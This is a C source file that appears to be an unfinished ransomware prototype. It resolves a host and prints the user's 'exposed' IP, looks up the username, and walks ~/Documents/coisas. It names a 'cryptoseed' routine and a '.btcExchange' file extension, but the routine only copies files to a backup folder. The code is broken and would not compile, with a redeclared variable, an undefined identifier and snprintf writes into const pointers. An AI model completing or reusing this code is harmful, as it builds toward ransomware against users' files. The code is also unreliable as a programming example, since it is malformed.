#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <unistd.h>

// Global vars;
char *username;
uid_t uid;

void cryptoseed(const char* folderPath, const char* ExtensionChange);

// Function to copy a file to another folder
void copyFile(const char* sourcePath, const char* destinationPath) {
    FILE* sourceFile = fopen(sourcePath, "rb");
    FILE* destinationFile = fopen(destinationPath, "wb");
    if (sourceFile == NULL || destinationFile == NULL) {
        printf("Failed to open file for copying or file not available\n");
        return;
    }
    char buffer[1024];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), sourceFile)) > 0) {
        fwrite(buffer, 1, bytesRead, destinationFile);
    }
    fclose(sourceFile);
    fclose(destinationFile);
}


int main() {
    const char *hostname = "google.com";
    struct addrinfo hints, *res;
    char ip_address[INET6_ADDRSTRLEN];

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    //Get adress info (from hostname);
    int result = getaddrinfo(hostname, NULL, &hints, &res);
    if (result != 0) {
        fprintf(stderr, "getaddrinfo failed: %s\n", gai_strerror(result));
        printf("Check internet connection.\n");
        return 1;
    }

    //Convert the ip from binary to text;
    void *addr;
    if (res->ai_family == AF_INET) {
        struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
        addr = &(ipv4->sin_addr);
    } else {
        struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)res->ai_addr;
        addr = &(ipv6->sin6_addr);
    }
    inet_ntop(res->ai_family, addr, ip_address, sizeof(ip_address));

    //Display the ip adress;
    printf("User ip is exposed, ip_adress: %s\n", ip_address);

    freeaddrinfo(res);

    //Get user's name (LINUX)
    uid = getuid();
    struct passwd *pw = getpwuid(uid);
    if (pw == NULL) {
        perror("getpwuid");
        return 1;
    }
    username = pw->pw_name;
    printf("Username located -> %s ✅\n", username);

    //Locate folder and change it's extensions;

    const char* folderPath = "/home/%s/Documents/coisas";

    char fullPath[512];
    sprintf(fullPath, folderPath, username);

    const char* ExtensionChange = ".btcExchange";
    

    cryptoseed(fullPath, ExtensionChange);

    return 0;
}

void cryptoseed(const char* folderPath, const char* ExtensionChange) {
    DIR* directory = opendir(folderPath);
    
    //Get user's name (LINUX)
    uid = getuid();
    struct passwd *pw = getpwuid(uid);
    if (pw == NULL) {
        perror("getpwuid");
    }
    username = pw->pw_name;
    printf("(cryptoseed) * Username located -> %s ✅\n", username);

    if (directory == NULL) {
        printf("Failed to open directory '%s'\n", folderPath);
        return;
    }

    const char* fullPath = "/home/%s/Documents/BackupMicro"; 
    // Format path string for $username;
    char fullPath[512];
    sprintf(fullPath, backupFolderPath, username);

    if (mkdir(fullPath, 0777) != 0) {
        printf("Failed to create backup folder or it already exists '%s'\n", fullPath);
        closedir(directory);
        return;
    }

    // Copy the files to the other folder and keep the extension changed files in the same folder as before.

    struct dirent* entry;
    while ((entry = readdir(directory)) != NULL) {
        if (entry->d_type == DT_REG) { // Process regular files only
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                snprintf(folderPath, sizeof(folderPath), "%s/%s", folderPath, entry->d_name);

                snprintf(fullPath, sizeof(fullPath), "%s/%s", fullPath, entry->d_name);

                // Copy file to backup folder
                printf("sourcefilePath is '%s'\n", folderPath);
                printf("destinationfilePath is '%s'\n", fullPath);
                copyFile(folderPath, fullPath);
            }
        }
    }


    closedir(directory);
}